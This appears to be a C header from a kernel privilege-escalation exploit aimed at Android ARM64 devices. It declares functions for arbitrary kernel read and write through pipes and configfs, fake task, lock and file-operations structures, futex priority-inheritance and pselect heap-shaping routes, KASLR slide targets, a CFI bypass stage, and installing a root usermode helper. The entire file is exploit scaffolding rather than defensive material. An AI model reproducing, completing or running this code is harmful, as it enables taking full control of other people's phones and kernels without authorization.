#ifndef COMMON_H
#define COMMON_H

#define _GNU_SOURCE
#define __ARM 1

#include "offset.h"

#define PAGE_SHIFT 12
#define PAGE_SIZE (1UL << PAGE_SHIFT)
#define KS_PAGE_SIZE 4096
#define KS_PAGE_MASK 0xfffULL

#ifndef VMEMMAP_START
#define VMEMMAP_START 0xffff800000000000ULL
#endif
#define VMEMMAP_END   0xffff800040000000ULL
#define DIRECT_MAP_BASE 0xffffff8000000000ULL
#ifndef STRUCT_PAGE_SIZE
#define STRUCT_PAGE_SIZE 0x40
#endif

#ifndef CFG_PAGE_OFF
#define CFG_PAGE_OFF            16
#define CFG_NEEDS_READ_FILL_OFF 80
#define CFG_BIN_BUFFER_OFF      88
#define CFG_BIN_BUFFER_SIZE_OFF 96
#define CFG_CB_MAX_SIZE_OFF     100
#endif

#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/futex.h>
#include <linux/memfd.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/resource.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/utsname.h>
#include <sys/uio.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#include "kernelsnitch/utils.h"

#define KERNEL_PAGE_SETUP_ATTEMPTS 6
#define SKB_DATA_DELTA (-0xe80LL)

#define MM_STRUCT_SZ 0x500
#define MM_ORDER 3
#define MM_PARTIALS 5
extern int g_core_main;
extern int g_core_consumer;
#define CORE (g_core_main)
#define CONSUMER_CORE (g_core_consumer)
#define KSNITCH_COLLISIONS 4

#define ASHMEM_NAME_LEN 256
#define __ASHMEMIOC 0x77
#define ASHMEM_SET_NAME _IOW(__ASHMEMIOC, 1, char[ASHMEM_NAME_LEN])
#define ASHMEM_NAME_PREFIX_LEN 11
#define ASHMEM_PREFIX_COUNT 0x6d6873612f766564ULL

#define PIPE_OBJECT_SIZE 0x800
#define PIPE_OBJS_PER_SLAB 16
#define PIPE_MAX_ATTEMPTS 12
#define PIPE_CANDIDATE_PAGES 8

#define PAGE_PAYLOAD_FOPS 0
#define PAGE_PAYLOAD_SLIDE 1

#define ORDER3_SIZE (PAGE_SIZE << MM_ORDER)
#define SKB_SEND_SIZE (ORDER3_SIZE * 2)
#define SKB_RECLAIM_SENDS 4
#define FOPS_TABLE_OFF FOPS_OFF
#define FOPS_PTR_OFF 0xc0
#define ASHMEM_FOPS (active_offsets ? active_offsets->off_ashmem_fops : 0)
#define ASHMEM_MISC_FOPS (active_offsets ? active_offsets->off_ashmem_misc_fops : 0)
#define SKB_FRAG_BIAS 0

#define FAKE_TASK_PRIO 120
#define FAKE_WAITER_PRIO 140
#define FAKE_TASK_UCLAMP_REQ_OFF 0x350
#define FAKE_TASK_UCLAMP_OFF 0x358
#define FAKE_UCLAMP_ACTIVE_BIT 16
#define FAKE_UCLAMP_MIN_ACTIVE (1U << FAKE_UCLAMP_ACTIVE_BIT)
#define FAKE_UCLAMP_MAX_ACTIVE \
  (1024U | (19U << 11) | (1U << FAKE_UCLAMP_ACTIVE_BIT))

#define TASK_COMM_LEN 16

#define P0_KERNEL_PHYS_DELTA (P0_KERNEL_PHYS_LOAD - P0_PHYS_OFFSET)
#define P0_DATA_ALIAS_CONST(image_addr) \
  (P0_PAGE_OFFSET | ((image_addr) - KIMAGE_TEXT_BASE + P0_KERNEL_PHYS_DELTA))

#define CONSUMER_MAX_CALLS 1
#define PSELECT_ROUTE_NFDS 320
#define PSELECT_CONSUMER_NICE 19
#define PSELECT_CONSUMER_BURST_CALLS 1
#define PSELECT_CONSUMER_SETTLE_USEC 250000
#define PSELECT_ENTER_DELAY_USEC 50000
#ifndef PSELECT_TIMEOUT_SEC
#define PSELECT_TIMEOUT_SEC 0
#endif
#define PSELECT_TIMEOUT_USEC 200000
#ifndef ROUTE_WAIT_SECONDS
#define ROUTE_WAIT_SECONDS 1
#endif
#define SLIDE_NFULNL_LOGGER \
  data_addr(SLIDE_NFULNL_LOGGER_IMAGE)
#define SLIDE_LOGGERS_0_1 data_addr(SLIDE_LOGGERS_0_1_IMAGE)
#define SLIDE_RANDOM_BOOT_ID_DATA \
  data_addr(SLIDE_RANDOM_BOOT_ID_DATA_IMAGE)
#define SLIDE_INIT_TASK data_addr(SLIDE_INIT_TASK_IMAGE)
#define SLIDE_ROOT_TASK_GROUP \
  data_addr(SLIDE_ROOT_TASK_GROUP_IMAGE)
#define SLIDE_SYSCTL_BOOTID data_addr(SLIDE_SYSCTL_BOOTID_IMAGE)

struct kernelsnitch_shared_state;

struct local_sched_attr {
  uint32_t size;
  uint32_t sched_policy;
  uint64_t sched_flags;
  int32_t sched_nice;
  uint32_t sched_priority;
  uint64_t sched_runtime;
  uint64_t sched_deadline;
  uint64_t sched_period;
};

struct mm_ctx {
  size_t mm_cnt;
  pid_t *childs;
  int *memfds;
};

struct user_pipe_buffer {
  uint64_t page;
  uint32_t offset;
  uint32_t len;
  uint64_t ops;
  uint32_t flags;
  uint32_t pad;
  uint64_t private;
};

extern uintptr_t page_base;
extern uintptr_t last_mm_struct;
extern uintptr_t fake_lock;
extern uintptr_t fake_w0;
extern uintptr_t fake_task;
extern uintptr_t fake_parent;
extern uintptr_t fake_right;
extern uintptr_t fake_left;
extern uintptr_t fake_fops;
extern uintptr_t binwrite_target;
extern int pselect_custom_write;
extern uintptr_t pselect_custom_target;
extern uintptr_t pselect_custom_value;

extern uint32_t f_wait;
extern uint32_t f_pi_target;
extern uint32_t f_pi_chain;
extern atomic_int waiter_ready;
extern atomic_int waiter_waiting;
extern atomic_int owner_started;
extern atomic_int owner_chain_done;
extern atomic_int route_done;
extern atomic_int waiter_tid;
extern atomic_int punch_consume_go;
extern atomic_int punch_consume_stop;
extern atomic_int consumer_calls;
extern atomic_int consumer_success;
extern atomic_int consumer_inflight;
extern atomic_int main_route_delay_usec;
extern atomic_int cfi_stage_done;
extern int route_last_step;
extern int route_last_errno;
extern int memfd_leak;
extern char ashmem_path[256];
extern int physrw_read_ok;
extern int physrw_write_ok;

int is_vivo(void);
int is_direct_ptr(uintptr_t addr);
int try_cfi_stage(void);
void handle_umh_mode(int argc, char **argv);
int pipe_phys_read_data(int fd, uintptr_t direct_addr, void *out, size_t len);
int pipe_phys_write_data(int fd, uintptr_t direct_addr, const void *data, size_t len);

int run_exploit(int argc, char **argv);
int install_umh_root(int configfs_fd);
int install_pipe_physrw(int configfs_fd);
void init_ashmem_path(void);
int open_ashmem_device(void);
int try_set_ashmem_name_blob(int fd, const unsigned char *blob, size_t len);
uintptr_t text_addr(uintptr_t image_addr);
uintptr_t canon_addr(uintptr_t image_addr);
void put_fake_fops_table(unsigned char *p, size_t off);
ssize_t configfs_write_once(int fd, uintptr_t target, const void *data, size_t len);
ssize_t configfs_read_once(int fd, uintptr_t target, void *data, size_t len);
uint32_t pipe_read32(int fd, uintptr_t addr);
uint64_t pipe_read64(int fd, uintptr_t addr);
int pipe_write32(int fd, uintptr_t addr, uint32_t value);
int pipe_write64(int fd, uintptr_t addr, uint64_t value);
int kernel_read_data(int fd, uintptr_t addr, void *buf, size_t len);
int kernel_write_data(int fd, uintptr_t addr, const void *buf, size_t len);
void read_first_line(const char *path, char *buf, size_t len);
void log_startup_context(void);
void init_cpu_config(void);
void disable_rseq_for_thread(void);
void init_p0_profile(void);
void init_local_log(const char *home_dir);
void log_printf(const char *fmt, ...);
extern uint64_t p0_kernel_phys_load;
extern uintptr_t g_init_cred_image;
struct kernel_offsets;
extern const struct kernel_offsets *active_offsets;
long futex_op(
    uint32_t *uaddr, int op, uint32_t val,
    const struct timespec *timeout, uint32_t *uaddr2, uint32_t val3);
long sched_setattr_tid(int tid, int nice_value);
uintptr_t p0_data_alias(uintptr_t image_addr);
uintptr_t data_addr(uintptr_t image_addr);
void clear_pselect_write(void);
void put64(unsigned char *p, size_t off, uint64_t value);
void put32(unsigned char *p, size_t off, uint32_t value);
pid_t clone_child(void);
pid_t clone_leak_child(void);
int open_memfd(pid_t child);
void kill_child(pid_t child);
void close_reclaim_sockets(void);
void setup_kernelsnitch(void);
int kernelsnitch_collisions_ready(void);
void run_kernelsnitch_bruteforce(void);
uintptr_t current_kernelsnitch_mm_struct(void);
uintptr_t cleanup_kernelsnitch(void);
void close_ctx_memfds(struct mm_ctx *ctx);
void free_ctx_storage(struct mm_ctx *ctx);
void cleanup_page_prepare_state(void);
int clone_memfd(void);
void prepare_ctxs(void);
int prepare_skb_payload(uintptr_t base, int payload_mode);
uintptr_t prepare_kernel_page(int payload_mode);
uintptr_t prepare_good_kernel_page(int payload_mode);
uint64_t perf_leak_candidate(int target_fd, int rounds);

void fdset_put_word(fd_set *set, int word, uint64_t value);
uint64_t fdset_get_word(const fd_set *set, int word);
void open_selected_fds(
    fd_set *in, fd_set *out, fd_set *ex, int read_fd, int write_fd);
void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex);
void do_pselect_fake_lock_route(void);
void reset_main_route_state(void);
int run_main_route_threads(void);
void set_pselect_write_mode(uintptr_t target, int mode);

#include "runtime_struct_offsets.h"

#endif
